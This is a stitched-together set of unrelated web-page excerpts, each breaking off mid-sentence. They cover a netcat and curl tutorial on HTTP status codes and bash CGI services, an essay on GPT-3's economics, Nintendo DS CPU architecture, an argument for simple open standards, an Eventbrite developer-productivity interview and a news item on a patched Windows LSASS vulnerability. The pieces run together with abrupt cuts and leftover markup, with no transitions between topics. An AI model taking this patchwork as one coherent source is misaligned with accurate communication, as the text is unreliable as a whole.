<p>To take a recent example, I’ve been working on a web service that talks to other web services. Someone would make a call to us, we’d call the back-end services, they’d time out or barf up some sort of error, and we’d pass back a 500 error to our client. They’d see it and email us asking what was wrong with our service. It’d be nice to let them know it’s not our fault and that they should pester the back-end systems people instead. We could send back a message body that says something like, “Back-end systems failure. Original error message follows,” but it turns out we can say that just by returning a different status code. Not only is there a 502 status code, which means that a back-end system failed, but there’s also a 504, which means that we timed out trying to contact it. That tells our client that they can try again in a little while and the request might go through.</p>

<p>Ok, enough talking. Now code.</p>

<h2 id="goin-all-mechanical-turk-on-this">Goin’ all Mechanical Turk on this</h2>

<p>To illustrate the first point, that this is all just text, I’m going to play human web server, using <code>netcat</code>. If you’re not familiar with it, it’s a standard unix utility that just opens a network connection. Anything you type gets sent along it; anything that comes back gets printed out on your screen. I open up a terminal and type:</p>

<pre><code>nc -l 3333
</code></pre>

<p>That starts up <code>netcat</code> listening on port 3333. Then I switch to my browser and tell it to go to <code>http://localhost:3333/</code>. The “page loading” indicator starts spinning. In the <code>netcat</code> terminal, I see:</p>

<pre><code>GET / HTTP/1.1
Host: localhost:3333
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
</code></pre>

<p>That’s Chrome telling me it wants the root resource (<code>/</code>, which Apache or whatever would normally interpret as <code>index.html</code>). It’s also telling me a lot about what kind of response it can handle. I’m going to ignore all that for now and just type:</p>

<pre><code>HTTP/1.1 200 OK 
Content-type: text/plain
Content-length: 7

Hello!
</code></pre>

<p>Pretty straightforward. The content length is 7 because it includes the return character after “Hello!” Here’s what we see in Chrome:</p>

<p><img src="https://raw.githubusercontent.com/bluegraybox/bash_REST/master/img/hws-1.png" alt="" title="Chrome window with plain text &quot;Hello!&quot;"></p>

<p>Switch back to the browser and go to <code>http://localhost:3333/index.html</code>. In the <code>netcat</code> terminal, we get a request that’s much the same as before, except the first line is:</p>

<pre><code>GET /index.html HTTP/1.1
</code></pre>

<p>Since they asked for HTML, I’ll give them HTML. I type:</p>

<pre><code>HTTP/1.1 200 OK
Content-type: text/html
Content-length: 16

&lt;h1&gt;Hello!&lt;/h1&gt;
</code></pre>

<p>And in Chrome we see:</p>

<p><img src="https://raw.githubusercontent.com/bluegraybox/bash_REST/master/img/hws-2.png" alt="" title="Chrome window with HTML H1 header &quot;Hello!&quot;"></p>

<p>So at some fundamental level, that’s all a web application is. It’s a program that listens for a connection, gets little text messages, interprets them, and sends back responses. How simple can we make that?</p>

<h2 id="restful-web-services-in-bash">RESTful Web Services in Bash</h2>

<p>How about this?</p>

<pre><code>#!/bin/bash

echo "Content-type:text/plain"
echo 
uptime
</code></pre>

<p><code>uptime</code> is a standard unix utility that reports how long the computer has been running and what the 1, 5, and 15 minute system load averages are. That’s marginally useful - I’ve actually used a script much like this for basic server monitoring. Put it in a file, make it executable, run it from the command line, and it’ll spit out something like:</p>

<pre><code>Content-type:text/plain

 21:29:32 up 9 days, 15:17,  5 users,  load average: 0.05, 0.10, 0.18
</code></pre>

<p>From here, if you want to follow along, you’ll need to have Apache set up and configured to let you run CGI scripts in the directory you’re working in. (That’s a whole tutorial on its own, but here’s some <a href="http://www.cgi101.com/book/connect/mac.html">instructions for Mac OS X</a>. Otherwise, Google for “apache enable cgi” and your operating system.)</p>

<p>On my machine, this script is saved as <code>public_html/api/v1/load/index.cgi</code>. That lets me access it as <code>http://localhost/~colin/api/v1/load/</code>, as we can see in Chrome:</p>

<p><img src="https://raw.githubusercontent.com/bluegraybox/bash_REST/master/img/v1-load.png" alt="" title="Chrome showing uptime report"></p>

<p>We can also use <code>netcat</code> in place of Chrome. Instead of listening on a port, we open a connection to the web server’s port:</p>

<pre><code>$ nc -c localhost 80
</code></pre>

<p>Then I type:</p>

<pre><code>GET /~colin/api/v1/load/ HTTP/1.1
Host: localhost
</code></pre>

<p>And I get this back from Apache:</p>

<pre><code>HTTP/1.1 200 OK
Date: Wed, 27 Aug 2014 01:14:11 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/plain

46
 21:14:19 up 9 days, 15:01,  5 users,  load average: 0.08, 0.18, 0.28

0
</code></pre>

<p>You can see that Apache includes a bunch of header fields that I didn’t bother to when I was playing web server. (I’ll trim most of these out of later examples to cut down on the clutter.) The more interesting thing is that it doesn’t have a <code>Content-length</code> header. What it has instead is <code>Transfer-Encoding: chunked</code>. That says that its content will be in chunks, prefixed by their size (in hexadecimal). 46 hex is 70, which is the length of the next line (again, counting the return character at the end). The ‘0’ for the next chunk says, “that’s all, folks!”</p>

<p>We can make this a little easier on ourselves by using <code>curl</code> instead of <code>netcat</code>. It’s a somewhat more custom tool for making HTTP requests. We can just run <code>curl -si http://localhost/~colin/api/v1/load/</code> from the command line, and get back:</p>

<pre><code>HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/plain

 22:05:42 up 9 days, 15:53,  5 users,  load average: 0.14, 0.13, 0.19
</code></pre>

<p>That’s the same as what <code>netcat</code> gave us (minus the header clutter), but notice that it combined the chunked response for us. Even at this level, some of the details are being hidden.</p>

<h2 id="status-seeking">Status Seeking</h2>

<p>Let’s take this a step further. The <a href="https://raw.githubusercontent.com/bluegraybox/bash_REST/master/v1/status/index.cgi">status script</a> gets a status message (“GREEN”, “YELLOW”, or “RED”) from a file, and prints it out like so:</p>

<pre><code>$ curl -si http://localhost/~colin/api/v1/status/
HTTP/1.1 200 OK
Content-Length: 4
Content-Type: text/plain

RED
</code></pre>

<p>It also lets us set a new status like so:</p>

<pre><code>$ curl -si -X PUT -d GREEN http://localhost/~colin/api/v1/status/
HTTP/1.1 204 No Content
Content-Length: 0
Content-Type: text/plain
</code></pre>

<p>Note that we used the same URL, but changed the HTTP method to <code>PUT</code> (instead of the default <code>GET</code> - don’t ask me why that’s the <code>-X</code> option) and specified “GREEN” as the data (<code>-d</code>) to be sent along with the request. We get back an exciting new response code: 204! Since we’re telling not asking, it doesn’t make much sense for the server to send anything back. The 204 status just says, “That thing you were doing? It worked.” No reason to have a message body saying “Success!” when the code already tells you that. I’ve definitely been guilty of reinventing that wheel before I ran across this.</p>

<p>What if we try to send a bad status, like ‘BLUE’?</p>

<pre><code>$ curl -si -X PUT -d BLUE http://localhost/~colin/api/v1/status/
HTTP/1.1 400 Bad Request
Content-Type: text/plain

Invalid status code
</code></pre>

<p>400 is the “your mistake” error code, which is pretty generic, so we include a descriptive message in the response body. Since it’s a user error, it’s reasonable to just have a human-readable message.</p>

<p>If you look at the script, you’ll see references to environment variables like <code>$REQUEST_METHOD</code>. That’s how Apache makes information about the request avaliable to the script (as part of the CGI standard). In case you want to see all of them, I’ve added an <a href="https://raw.githubusercontent.com/bluegraybox/bash_REST/master/env/index.cgi">env script</a>, which dumps them all out, plus the content. You can hit it with Chrome or <code>curl</code>, or even <code>netcat</code>. See what’s different between them.</p>

<h2 id="api-documentation">API Documentation</h2>

<p>Ok, great! Now we have two simple yet useful web services. But they’re not so simple that they don’t need any documentation, so let’s add some. We could have some sort of parallel hierarchy for documentation, like <code>/api/docs/v1/load/</code>, etc., but that’s kinda clunky. Instead, let’s rework our services so they give you data when you ask for data, and text when you ask for text. For that, we take advantage of the <code>Accept</code> header. Take a …</p></section></article></div></div></div></div>

                <div>
                    <p>Hype or not, GPT-3, OpenAI’s newest natural language AI model, has been percolating in the back of my mind ever since it was announced <a href="https://openai.com/blog/openai-api/">two months ago</a>. This post will be some open musing of what I think its implications are in the intersection of tech, business, and geopolitics.</p><p>【想看<a href="https://interconnected.blog/gpt-3-abstraction-of-time-money/#chinese-version-below">中文的读者请点击这里</a>或滚动到本页下方】</p><p>Not to get too philosophical, but I see GPT-3 as <strong>a beautiful abstraction of the relationship and tradeoffs between time and money.</strong> (Don’t worry, this isn’t the machine talking. This is still written by me, the human author, not GPT-3.)</p><h2 id="gpt-3-in-a-nutshell">GPT-3 in a Nutshell</h2><p>To quickly summarize what is GPT-3 in plain language: it’s the 3rd generation of OpenAI’s natural language processing model, the previous generation being GPT-2, <a href="https://openai.com/blog/better-language-models/">released in early 2019</a>. GPT-3 has <strong>175 billion parameters </strong>compared to GPT-2’s 1.5 billion parameters. In the world of Deep Learning AI, if a model has more parameters, it’s (literally) bigger, more complex, and usually produces better results. In this case, GPT-3 is more than 100-times bigger than GPT-2. GPT-3 is also trained on a much larger dataset -- almost a trillion words from the Common Crawl dataset, which crawls the entire Internet and makes the data publicly available for research. Again, in Deep Learning AI, more training data usually produces a better model, thus better results from that model. Presumably, there will be GPT-4, 5, 6, etc. that will be more powerful than GPT-3.</p><p><em>(There are of course many more details to GPT-3’s underlying technology. Since Interconnected caters to a wide range of readers, I won’t belabor all the details here. I’d encourage readers who are technical to </em><a href="https://arxiv.org/pdf/2005.14165.pdf"><em>read the GPT-3 paper</em></a><em>, which lays out all aspects of the model, including algorithm, architecture, training process, evaluation, limitations, and ethical implications.)</em></p><p>GPT-3 is also <em>not</em> open sourced. Instead, the model’s abilities are exposed through an API layer that can be controlled. OpenAI’s justification is to limit malicious use of the model; if someone is abusing GPT-3 for nefarious purposes, OpenAI can turn off that user’s access to the API. Given just the limited examples of “magical” things that hobbyists have <a href="https://gptcrush.com/">produced using GPT-3</a> -- from business writing and poetry, to designing a website and other forms of simple coding -- I think this approach is well-justified, even though it goes against my default position that always prefers open source.</p><p>This approach is not without its critics. When GPT-2 was first released, it was heavily criticized, both <a href="https://venturebeat.com/2019/02/22/ai-weekly-experts-say-openais-controversial-model-is-a-potential-threat-to-society-and-science/">externally by other AI researchers </a>and <a href="https://www.technologyreview.com/2020/02/17/844721/ai-openai-moonshot-elon-musk-sam-altman-greg-brockman-messy-secretive-reality/">internally by OpenAI employees</a>, for being not open sourced. These critiques also have merit: openness and transparency are important for other researchers to reproduce the technology. After all, good results can always be hard-coded and human-generated on the backend. OpenAI eventually open sourced GPT-2, as <a href="https://github.com/openai/gpt-2">a public repository that is archived</a>, after it felt comfortable that the model won’t be abused. I expect GPT-3 to follow this measured path to eventually becoming open sourced.</p><h2 id="money-can-solve-a-lot-of-problems">Money Can Solve (a lot of) Problems</h2><p>Money can’t solve all our problems, but in the case of GPT-3, it has solved a lot of problems. In this context, money means cloud computing resources to train the model, where the larger the model and training dataset (both of which are very large for GPT-3), the more expensive it is to compute.</p><p>Broadly speaking, the path to developing AGI (artificial general intelligence) falls in one of two camps. One end of the research believes that Deep Learning is <em>not</em> the ultimate technique and more innovation is necessary. The other end believes that the necessary techniques are all available, so the focus should be on how to put them together and scale their training process and production deployment. More succinctly, the former thinks <em><strong>more time</strong></em> is needed to create better techniques, the latter thinks <em><strong>more money</strong></em> is needed to scale the current Deep Learning techniques.</p><p>According to <a href="https://www.technologyreview.com/2020/02/17/844721/ai-openai-moonshot-elon-musk-sam-altman-greg-brockman-messy-secretive-reality/">this MIT Technology Review profile </a>of OpenAI, the group’s strategy squarely falls in the “more money” camp. That’s why it has a rather bizarre corporate structure that’s a hybrid of a nonprofit and a normal VC-backed startup, but the investors’ returns are capped at a certain multiple -- 100x for the earliest round of investors. Microsoft also invested <a href="https://venturebeat.com/2019/07/22/microsoft-invests-1-billion-in-openai-to-develop-ai-technologies-on-azure/">$1 billion in OpenAI</a> with a preferred partnership to use Azure’s cloud infrastructure, as Microsoft works to develop its own AI supercomputer for its cloud offering.</p><p>(<em>Aside: this partnership was quite a coup for Microsoft and to the detriment of Google in particular, given that GPT-3’s theoretical foundation, known as the transformer architecture, originated from Google. Google has also been developing its special-purpose Deep Learning hardware, the TPU (tensor processing unit), to differentiate GCP as the most capable AI cloud on the market. Google of course owns DeepMind, the other AGI company, so forging a partnership with OpenAI may even be a conflict of interest. For what it’s worth, Satya Nadella was openly bullish about </em><a href="https://seekingalpha.com/article/4360065-microsoft-corp-msft-ceo-satya-nadella-on-q4-2020-results-earnings-call-transcript?part=single"><em>GPT-3 during Microsoft’s most recent earnings call</em></a><em> when talking about Azure. Whether OpenAI will help propel Azure to become the market-leading AI cloud or will Google maintain its technical advantage is a competitive dynamic worth watching.)</em></p><figure><img src="https://lh3.googleusercontent.com/P7Sj0IoAnhqFEsCeBUNob3mMvPFsfmy4N6wzps1Klma6dbt4EW2lwBnTO2-96jdnJXlM5L8kTpT7QVAArL3VEbljsZ9F5WE38mnF792VrhKFAaySr2AeOulSRsSl_w-EPCSL_3Z1" alt=""><figcaption>Transformer Architecture model. Source: https://medium.com/inside-machine-learning/what-is-a-transformer-d07dd1fbec04</figcaption></figure><p>That $1 billion Microsoft money is rumored to be <a href="https://www.technologyreview.com/2020/02/17/844721/ai-openai-moonshot-elon-musk-sam-altman-greg-brockman-messy-secretive-reality/">a split between cash and Azure credits</a>. Regardless of which form the money comes in, OpenAI could use it and is using it. GPT-3 is estimated to have <a href="https://venturebeat.com/2020/06/11/openai-launches-an-api-to-commercialize-its-research/">a memory requirement of more than 350GB and a training cost </a>of more than <strong>$12 million</strong>. That’s likely the cost of a single round of training. <strong>Most models go through several rounds of training to achieve good results. </strong>Training GPT-3 three or four times could easily sink around $50 million, and that doesn’t include the cost of data cleaning and pipelining that usually goes into preparing a model for training.</p><p>OpenAI has <a href="https://openai.com/blog/ai-and-compute/">done some interesting research</a> on the connection between the amount of compute used and progress in AI (though perhaps just to support its “more money” approach). Since 2012, the amount of compute used in the largest AI training exercises (e.g. AlphaZero) has been <strong>doubling every 3.4 months</strong>. The research compares and contrasts this finding with <a href="https://en.wikipedia.org/wiki/Moore%27s_law">Moore’s Law</a>, which observes the doubling of the number of transistors on a chip <strong>every two years</strong>. This comparison is only useful to the extent that while <a href="https://www.technologyreview.com/2020/02/24/905789/were-not-prepared-for-the-end-of-moores-law/">Moore’s Law may be reaching its limit</a>, AI computing advancement is far from slowing down. And much of this advancement is focused on parallel computing (i.e. efficient use of multiple chips processing workloads at the same time) and creating more special-purpose AI chips (e.g. TPUs or Tesla’s <a href="https://interconnected.blog/tesla-china-the-tech-cold-war/">Full-Selfing Driving chip</a>, which I’ve written about before), thus it is not directly constrained by Moore’s Law either.</p><figure><img src="https://lh6.googleusercontent.com/i525LbrPPQ941EnDlacKkYUkIdxSH70elCufr2_YA0-g9dvGJl-5aoMmWwfl_HePRJUrIpyQJAndwNAzNE9GIZhKKTIYnv5L8o8OrMXVmrMECG01-N5MMwEiiXEsTwjO4Z8jbHe8" alt=""><figcaption>Source: https://openai.com/blog/ai-and-compute/</figcaption></figure><p>I have a pragmatic attitude towards AI (and most things) and don’t have a strong opinion between the “more time” vs “more money” approach. If it’s working, it’s working.</p><p>It looks like GPT-3 is definitely working. Even if OpenAI’s <strong>observation and development strategy turn out to be half true</strong>, we will see future generations of GPT advance rapidly within the next five years.</p><h2 id="time-and-expertise-is-premium">Time and Expertise is Premium</h2><p>So what is there left for humans to do? Plenty, but differently.</p><p>What AI models, like GPT, do to language understanding and state-of-the-art computer vision models do to visual understanding is the <strong>continuous commoditization of rote memorization (X is Y) and basic pattern matching (when X happens, Y usually happens), where the value approaches zero</strong>. Thus, any task that falls in one of these two broad categories that is currently done by human beings will be done more by AI.</p><p>We can get a hint of which industries GPT-3 may impact in this way, just by looking at the <a href="https://venturebeat.com/2020/06/11/openai-launches-an-api-to-commercialize-its-research/">initial list of beta users</a>:</p><ul><li>Algolia (search engine)</li><li>Koko (mental health and emotional well-being via chat)</li><li>MessageBird (customer service via text or voice)</li><li>Sapling (HR and operations processes)</li><li>Replika (mental health bot that keeps you company)</li><li>Quizlet (online education via flashcard quizzes)</li><li>Casetext (legal research)</li><li>Reddit (public discussion forum)</li><li>Middlebury Institute (higher education, known for having one of the top foreign language study programs in the world)</li></ul><p>This list of companies and institutions may seem to cover a wide range of unrelated use cases, but they all have an element of memorization or basic pattern matching to their workflow that can be standardized by a well-functioning AI model to ensure consistency and quality. Furthermore, the GPT-3 paper revealed that while training the model was expensive (prohibitively so for most companies), producing inferences (aka results) <a href="https://arxiv.org/pdf/2005.14165.pdf">from the trained model is cheap and consumes little energy</a>. Thus, from a cost-efficiency perspective, companies will be incentivized to build their services on top of something like GPT.</p><p>What all this means, I believe, is that there will be a premium for the one thing that requires more time, but not necessarily money, to acquire: <strong>deep domain expertise</strong>.</p><p>Vitalik Buterin, the creator of the Ethereum blockchain, captured this possibility well in this tweet:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I can easily see many jobs in the next 10-20 years changing their workflow to "human describes, AI builds, human debugs". <a href="https://t.co/96ZSNr0YoN">https://t.co/96ZSNr0YoN</a></p>— vitalik.eth (@VitalikButerin) <a href="https://twitter.com/VitalikButerin/status/1284185128768503808?ref_src=twsrc%5Etfw">July 17, 2020</a></blockquote>

</figure><p>What’s implicit in a “human describes, AI builds, human debugs" future is that the human must have enough expertise <strong>built over time</strong> to know “how to describe” a problem and “what to debug”. What this also means is that the very notion of “domain expertise” will become more niche and specific.</p><blockquote><em>Knowing how to onboard a new employee <strong>may not be</strong> that valuable; knowing how to onboard a junior engineer two years out of college, so she can be …</em></blockquote></div></section></article></div></div></div>

The Nintendo DS includes two very independent computers that will perform exclusive operations, each one having a dedicated bus. This co-dependency will condition the overall performance of this console.</p><p>That being said, let’s take a look now at the two CPUs:</p><div><ul><li id="tab-1-1-arm7tdmi-link"><a href="#tab-1-1-arm7tdmi">ARM7TDMI</a></li><li id="tab-1-2-arm946e-s-link"><a href="#tab-1-2-arm946e-s">ARM946E-S</a></li></ul><div><div id="tab-1-1-arm7tdmi"><h4>ARM7TDMI</h4><div><a href="https://www.copetti.org/images/consoles/nintendods/cpu/arm7_core.8a9851c20df1dda3c252ae75f544a8ce7a6749026fa4bc870027741cda1003b4.png"><picture>

If you ignore the ill-fated ARM8 series, you could say the ARM946E-S is the ‘next-gen’ version of the ARM7. Part of the <strong>ARM9 series</strong>, this core in particular not only inherits all the features of the <strong>ARM7TDMI</strong> but also includes some additional bits:</p><ul><li>The <strong>ARMv5TE ISA</strong>: Compared to the previous v4, features some new instructions and a faster multiplier.<ul><li>If you take a look at the core name, the letter ‘E’ means <strong>Enhanced DSP</strong> which implies that lots of these new instructions have to do with applications for signal processing.</li></ul></li><li><strong>5-stage Pipeline</strong>: This is another increment from the previous 3-stage pipeline.</li><li><strong>12 KB of L1 Cache</strong>: The core now features cache, where 8 KB are allocated for instructions and 4 KB for data.</li><li><strong>48 KB of Tightly-Coupled Memory</strong> or ‘TCM’: Similar to <a href="https://www.copetti.org/projects/consoles/playstation/#cpu">Scratchpad memory</a>, however this one discriminates between instructions (32 KB) and data (16 KB).</li></ul><p>Nintendo also added the following components around it:</p><ul><li>A <strong>Divisor and Square root unit</strong> to speed up these type of operations (the ARM9 by itself is not capable of performing this type of math).</li><li>A <strong>Direct Memory Access Controller</strong>: Accelerates memory transfers without depending on the CPU.

In doing so, it effectively halts the ARM9, disables most of the ‘special’ hardware, redirects the buses, puts the ARM7 in charge and slows it down at 16.78 MHz. Finally, the ARM7 proceeds to boot the original AGB BIOS which bootstraps the GamePak cartridge (just like an original GameBoy Advance). This mode still exhibits some features not found in the original console, such as displaying the game with black margins (we’ll see in the next section that the new screen resolution happens to be bigger).

If that wasn’t enough, <strong>ARM9’s external bus runs at half the speed</strong>, so there are a few bottlenecks identified.</p><p>Additionally, the Main Memory bus is only <strong>16-bit wide</strong>. Thus, whenever any CPU needs to fetch a word (32-bit wide) from memory, the interface <strong>stalls the CPU</strong> (up to 3 ‘wait’ cycles) until a full world is reconstructed. The worst impact happens when memory access is not sequential, which makes it stall for every single access. This issue will also arise when instructions are fetched (unfortunately, ARM didn’t support sequential opcode fetching back then) which, to my dismay, also affects Thumb code (since every 16-bit fetch is done as a 32-bit block).

For this, DEC grabbed the datapath design of their processor, <strong>Alpha</strong>, and mixed it with ARM’s. The result was a new series of CPUs called <strong>StrongARM</strong> which was surprisingly <em>fast</em>. At the expense of removing certain features (Thumb and debug), DEC managed to cross the megahertz threshold by reaching speeds of up to 233 MHz. As a normal user prepared to buy a new ARM PC (let’s say a <em>RiscPC</em>), you could either choose one with the old ARM710 at 40 MHz or another one with a StrongARM running ~582% faster. The impact of StrongARM was so disruptive that ARM Holdings absorbed some of StrongARMs features to produce their next line of CPUs, starting with ARM9. And the rest is history.</p><p>But here’s where my question resides: Considering the new developments in the ARM world, why did Nintendo ultimately choose an awfully slow ARM9 combined by an even slower ARM7, instead of a faster ARM9 (or even a StrongARM)? To give you an idea, other companies like Apple just adopted the StrongARM with their Newton PDA line.</p><p>I don’t mean to criticise Nintendo’s choice, but I believe the amount of emerging technology was just too great for me to ignore. I guess their choice was done in an effort to preserve battery life and maintain production costs (by using the same CPU found in the GBA).</p></div></div></div><hr><h2 id="graphics">Graph…</h2></div></div></div>

If you want to create a truly open standard, you _need_ to make it simple.

There are no exceptions to this rule. When a standard becomes harder to fully implement than what your average motivated programmer can do in two months (max!), it _shouldn't_ be considered "open" anymore.

Why?

</p>
<h2>Complicated Standards Lead to Implementation Monopolies</h2>
<p>Since implementing a complex standard is hard, you will eventually end up with the implementation that started the earliest and maintained since, being the only implementation that is actually usable. And that implementation will most likely be the one created by the standard's creators.

In cases where the standard's creators don't maintain an implementation like "the web"⁰, the only choices are either the standard dying out because of it's complexity, or the actively maintained implementations requiring tons of effort, with (most likely) companies backing said implementations.

</p>
<h2>Implementation Monopolies Lead to Extensions</h2>
<p>If a big implementation just decides one day that your standard is lacking, they can just extend the parts they want. The two outcomes of this being that:

</p>
<ul><li>The other implementations copy their extensions</li>
<li>That one implementation getting more users, and eventually, a near monopoly because of a bigger feature set</li></ul>
<p>
At that point, the "standard" implemented by said implementations is longer the actual defined standard, but because people will inevitably use the said extensions, any new implementation that wants to be considered usable will eventually need to support said proprietary extensions.

</p>
<h2>Too Many Extensions Spoil The Standard</h2>
<p>Even if you have an "open" extension system, where implementations can all propose and agree on extensions to the standard, you need to be able to keep those implementations in check, so their extensions don't overcomplicate the standard.

Remember: Having a simple standard with a million extensions is no better than a complex standard with no extensions.

</p>
<h2>Examples</h2>
<p>Please note that I will be skipping the elephant in the room: "the web", as it has been discussed _to death_.

</p>
<h3>Matrix</h3>
<p>Matrix is _technically_ an open standard. But because of the complexity it has accumulated over the years, Synapse is the only usable server implementation. Even Dendrite, the new implementation by *the same folk that created the standard*, is barely usable after _years_.

The same applies to Matrix clients, with Element being the only usable client implementation. That space definitely seems healthier than the server space, but the same issues are there.

</p>
<h3>Various Programming Languages</h3>
<p>I will not be specifying any language, as I might get any specifics incorrect, but a general pattern I have seen is that most programming languages have only a few compiler/interpreter implementations, even though the language is standardized in some form.

This example actually has some interesting reasoning behind this issue on top of the complicated standards:

</p>
<ul><li>Writing a compiler/interpreter can be hard.</li>
<li>Especially if the current implementations do optimizations or other "clever" tricks.</li></ul>
<p>
These issues can devolve into arguments regarding seeing the complexity of these issues as a part of the standard, and other "technology is too complicated in general" arguments, which I will not dive into here.

</p>
<h3>X Display Server</h3>
<p>The X Display Server standard got so complicated, the people developing it decided to abandon it entirely and create Wayland.

It probably didn't help that most of the standard was no longer being used, and a lot of extensions are required for its use today.

Wayland probably will also suffer the "too many extensions" problem at some point, so I am looking forward to that too...

</p>
<h2>Footnotes</h2>
<p>0: Well, Google, Mozilla and Apple all had a hand in most of the "modern" parts of the standards...

<source data-srcset="https://kelda.io/img/blog/interview%20microphone.webp" type="image/webp"></picture><p><h2>Published on Aug 11, 2020</h2></p></section><p>Deciding when to invest in developer productivity improvements is hard. If you’re on the ops side of things, you’re usually concerned about production and releases. If you’re a developer, you’re concerned about getting new features out as quickly as possible.</p><p>Usually, teams make development productivity improvements in two situations. Either the fix is so small that you can just do it in addition to your other work, or development is so painful that making changes has ground to a halt.</p><p>However, there’s still a large murky middle ground: how do you decide that it’s worth investing in a <strong>large change</strong> to your development workflow <strong>before development has ground to a halt?</strong></p><p><a href="https://medium.com/@remy.dewolf">Remy DeWolf</a> spent three years making these sorts of decisions as a <strong>principal engineer on the DevTools team at Eventbrite</strong>. He was part of the decision to build <code>yak</code>, which moved Eventbrite’s development environment into the cloud. This was a highly calculated decision since it cost a few EC2 instances per engineer and <code>yak</code> was built from scratch.</p><p>In this first post, we’ll dig into how Remy made this tough decision, and got buy-in from the rest of the company. In our next post, we’ll get into the nitty-gritty on how their remote development environment works, and what it’s been like for developers.</p><h2 id="how-is-the-eventbrite-application-architected">How is the Eventbrite application architected?</h2><p>This is a common story that you will find in a lot of startups. The founding engineers built a monolith and the strategy was to build features fast and capture the market. It was a very successful approach.</p><p>As the company grew over time, having a large team working on the monolith became challenging. And after a certain size, it was also harder to keep scaling the monolith vertically.</p><p>Over time, some of the monolith was migrated over to microservices. New services are generally containerized, and the monolith is containerized in development but not in production.</p><h2 id="whats-your-development-environment-setup-now">What’s your development environment setup now?</h2><p>Every engineer runs <strong>~50 containers</strong> which corresponds to the monolith, the microservices, the data stores (MySQL, Redis, Kafka…) and various tools (logging, monitoring).</p><p>Developers use <code>yak</code> (which we built internally) to deploy and manage their remote containers.</p><p>We use AWS EKS for the Kubernetes clusters, in which every developer has their own namespace. We have hundreds of developers and many EKS clusters.</p><p><code>yak</code> is very similar to <a href="https://kelda.io/blimp">blimp</a> since it enables the engineers to manage their remote containers without exposing them to the complexity of Kubernetes.</p><h2 id="how-did-you-decide-it-was-time-to-build-yak">How did you decide it was time to build yak?</h2><p>Before <code>yak</code>, each developer ran their development environment locally on their laptop. However, the development environment became so big that it slowed down developer laptops.</p><p>The main issue was that you might not realize that this was an issue because it was creeping one service at a time.</p><p>Once we added instrumentalization to our tools, we started to understand the scale of the problems. Moving to the cloud is expensive but when we were able to put it side by side with the wasted engineering time, the decision was easy for us.</p><p>Another goal of <code>yak</code> was to make Kubernetes easy for developers. We kept it as minimal as possible and the configuration files are plain Kubernetes manifest files. The intent was to feed developer curiosity so they learn more about Kubernetes over time.</p><h2 id="what-areas-do-you-recommend-tracking-regarding-developer-productivity">What areas do you recommend tracking regarding developer productivity?</h2><p>Whenever possible, align the developer productivity goals with the business. Every DevTool team should understand how they contribute to the company goals and vice versa. If this is unclear, I would start with that.</p><p>Next, make sure that developer productivity is part of the plan, not an afterthought. For example, some engineering teams move to microservices and only track the number of services and the uptime in production. These are great metrics, but they’re incomplete. They will generate inconsistency and the developer experience will suffer over time.</p><p>In terms of which metrics to pick, there is no general recommendation. It’s important to understand how developers work, understand how frequently they perform critical tasks, and instrument the tools that they use. With this data, you will be able to identify the most important areas to invest and track the progress over time.</p><p>I would also recommend having a metric about mean time to recovery (MTTR). If a developer is completely stuck, how would you bring them back to a clean state so they can resume their work? For this one, if you run the developer environment locally, you will have many different combinations of OS/tools/versions resulting in many different issues. If you are on the cloud and use a generic solution (e.g. Docker + Kubernetes), this problem will be much easier to solve.</p><h2 id="how-did-you-collect-feedback-at-eventbrite">How did you collect feedback at Eventbrite?</h2><p>We had many channels:</p><ul><li>Instrumentation into the tools. Every time a developer would build, run, or deploy docker images we would send metrics. Similarly, every CI job would do the same. Then we would generate some dashboards for the metrics to track and measure the progress over time. If you are using a tool like Sumologic or Datadog, it’s very easy to send custom metrics and build dashboards.</li><li>Quarterly engagement surveys.</li><li>Demos: invite other engineers to show them the progress and engage with them.</li><li>New hires: these new employees bring a fresh perspective and they are not afraid to ask questions and challenge the status quo.</li><li>Networking: build relationships with other developers (coffee breaks, office visits, lunches, etc..)</li></ul><h2 id="can-you-give-some-examples-of-developer-productivity-okrs">Can you give some examples of developer productivity OKRs?</h2><ol><li><p><strong>Time to start the developer environment is under x min</strong></p><p>This time is usually wasted time, so it’s important to track it and improve it. If the dev stack is unreliable or slow, it would be captured in this OKR.</p></li><li><p><strong>Engagement is over x%</strong></p><p>If you send an engagement survey every quarter, you can have an OKR to make sure the trend is upward. Seeing a drop would mean that the team might not be working on the most relevant projects.</p></li><li><p><strong>Average time from commit to QA/Prod</strong></p><p>This one will capture the CI/CD pipeline effectiveness. If you experience some flaky tests or deployment errors in the pipeline, it would negatively impact the key results.</p></li></ol><p>Over time, some OKRs will be exhausted, so consider renewing them over time. For example, if your survey always has the same questions, developers will eventually stop responding. Also if an OKR has been greatly improved, it’s a good time to shift priorities.</p><p>In my personal experience, I would focus on a few OKRs instead of having too many. Sometimes by trying to please everybody, you will not have a big impact. Some projects might require the full team focus, which can temporarily impact other OKRs. This would be a calculated strategy as these projects would bring huge improvements when delivered.</p><h2 id="are-there-any-warning-signs-people-should-look-out-for-in-order-to-know-their-developer-productivity-is-suffering">Are there any warning signs people should look out for in order to know their developer productivity is suffering?</h2><p>This is where it’s important to have good metrics and monitor them over time.

Forshaw discovered that nearly all Windows operating systems including Windows 8.1, Windows 10, and Windows Server versions are vulnerable to an elevation of privilege vulnerability in the Windows Local Security Authority Subsystem Service (LSASS).</p><p>The vulnerability identified by Forshaw was issued a unique identifier, CVE-2020-1509 and has a CVSS score of 8.8/10.&nbsp; Potential hackers could exploit the vulnerability through specially crafted authentication requests to gain escalated privileges within the Windows system. However, for successful exploitation, the hacker needs to have previously obtained Windows credentials for the local network.&nbsp;“LSASS doesn’t correctly enforce the Enterprise Authentication Capability which allows any AppContainer to perform network authentication with the user’s credentials,” Project Zero security researcher James Forshaw noted in May.</p><p>Microsoft had acknowledged the severity of the LSASS vulnerability and addressed the issue through a fix issued through the <a href="https://androidrookies.com/microsoft-releases-windows-10-cumulative-update-kb4566782-here-is-the-complete-changelog/">August 2020 Patch Tuesday update released on 11th August 2020</a>.&nbsp; Microsoft on its security bulletin says that the patches released through the August 2020 Patch Tuesday fix the issue and there is no further need for 